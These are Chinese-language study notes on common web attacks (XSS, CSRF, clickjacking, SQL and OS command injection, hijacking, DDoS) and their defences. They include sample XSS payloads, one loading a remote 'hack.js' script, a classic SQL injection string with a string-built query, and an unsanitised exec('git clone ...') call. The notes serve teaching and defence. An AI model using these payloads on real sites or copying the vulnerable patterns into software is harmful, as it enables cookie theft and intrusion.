# 网络安全
常见web攻击方式
- xss
   Cross-site Scripting 跨站脚本攻击，因为缩写和css重名，所以只能叫XSS
   跨站脚本攻击是通过存在安全漏洞的web网站注册用户的浏览器内运行非法的非
   本站点的HTML标签或者JavaScript进行的一种攻击

   跨站脚本攻击可能造成以下影响：
   1. 利用虚假的输入表单骗取用户的个人信息
   2. 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
   3. 显示伪造的文章或者图片 
   

   - 反射型 - url参数直接注入
     1. 普通 http://localhost:3000/?from=china
     2. alert 尝试 http://localhost:3000/?from=<script>alert(1)</script>
     3. 获取cookie
     4. 短域名伪造

   - 存储型 - 存储到DB后读取注入
     1. <script>alert(1)< script>
     2. <script src='http://lcalhost:4000/hack.js'></script>
  危害：
      1. 获取页面数据
      2. 获取Cookies
      3. 劫持前端逻辑
      4. 发送请求
      5. 偷取网站的任意数据
      6. 偷取用户资料
      7. 偷取用户秘密和登录状态
      8. 欺骗用户
    
    防范手段：
     - ejs转义小知识
            <% code %> 用于执行其中的js代码
            <% =code %> 会对code进行html转义
            <% -code %> 不会转义
     - ctx.set('X-XSS-Protection',0) 禁止XSS过滤
     - CSP 内容安全策略 本质就是建立白名单，开发者明确告诉浏览器哪些外部资源是可以加载的，我们只需要配置规则，如何拦截就是浏览器的事
     (Content-Security-Pollicy: default-src 'self')只允许加载本站资源
     (Content-Security-Pollicy:img-src https://*)只允许加载HTTPS本站资源
     (Content-Security-Policy: child-src 'none') 不允许加载任何来源框架

- CSRF (Cross Site Request Forgery)

     跨站请求伪造，是一种常见的web攻击，他利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。

     危害：
     1. 利用用户登录状态
     2. 用户不知情
     3. 完成业务请求
     4. 盗取用户资金 (转账，消费)
     5. 冒充用户发帖背锅
     6. 损害网站名誉

     防御：
      1. 禁止第三方网站带Cookie - 有兼容性问题
      2. Referer Check - Https不发送referer
      3. 验证码

- 点击劫持 (clickjacking) 
    点击劫持是一种视觉欺骗的攻击手段，攻击者将需要攻击的网站通过iframe嵌套的方式嵌入到自己的网页中，应将iframe设置为透明，在页面中透出一个按钮诱导用户点击。

    防御：
       1. X-FRAME-OPTTIONS 是一个HTTP响应头，就是为了防御用iframe嵌套的点击劫持攻击
          DENY 页面不允许通过iframe方式展示
          SAMEORIGIN 页面可以相同域名下通过iframe方式展示

- SQL注入
    1 'or' 1 '='1

    SELECT * 
    FROM test.user
    WHERE username = `${ctx.request.body.username}`AND password =`${ctx.request.body.password}`

    防御：
    所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入的变量嵌入SQL语句中

- OS命令注入
    OS命令注入和SQL注入差不多，只不过SQL注入是针对数据库，OS是针对操作系统

    例如：以node.js为例
    const exec = require('mz/child_process').exec
    let params = {<!-- 用户输入的参数 -->}
    exec(`git clone ${params.repo} /some/path`)

- 请求劫持
     DNS服务器(DNS解析各个步骤)被篡改，修改域名解析的结果，使得访问到的不是预期的ip

     HTTP劫持
     运营商劫持，此时大概智能升级HTTPS

- DDOS攻击
DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。

其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来大量正常的请求，超出服务器的最大承受量，导致宕机。我遭遇的就是 cc 攻击，最多的时候全世界大概20多个 IP 地址轮流发出请求，每个地址的请求量在每秒200次~300次。我看访问日志的时候，就觉得那些请求像洪水一样涌来，一眨眼就是一大堆，几分钟的时间，日志文件的体积就大了100MB。说实话，这只能算小攻击，但是我的个人网站没有任何防护，服务器还是跟其他人共享的，这种流量一来立刻就下线了。

防御：
# 备份网站
防范 DDOS 的第一步，就是你要有一个备份网站，或者最低限度有一个临时主页。生产服务器万一下线了，可以立刻切换到备份网站，不至于毫无办法。

备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公告，告诉用户，网站出了问题，正在全力抢修。我的个人网站下线的时候，我就做了一个临时主页，很简单的几行 HTML 代码。
# HTTP 请求的拦截
如果恶意请求有特征，对付起来很简单：直接拦截它就行了。

HTTP 请求的特征一般有两种：IP 地址和 User Agent 字段。比如，恶意请求都是从某个 IP 段发出的，那么把这个 IP 段封掉就行了。或者，它们的 User Agent 字段有特征（包含某个特定的词语），那就把带有这个词语的请求拦截。

拦截可以在三个层次做。
# 带宽扩容
# CDN
CDN 指的是网站的静态内容分发到多个服务器，用户就近访问，提高速度。因此，CDN 也是带宽扩容的一种方法，可以用来防御 DDOS 攻击。

网站内容存放在源服务器，CDN 上面是内容的缓存。用户只允许访问 CDN，如果内容不在 CDN 上，CDN 再向源服务器发出请求。这样的话，只要 CDN 够大，就可以抵御很大的攻击。不过，这种方法有一个前提，网站的大部分内容必须可以静态缓存。对于动态内容为主的网站（比如论坛），就要想别的办法，尽量减少用户对动态数据的请求。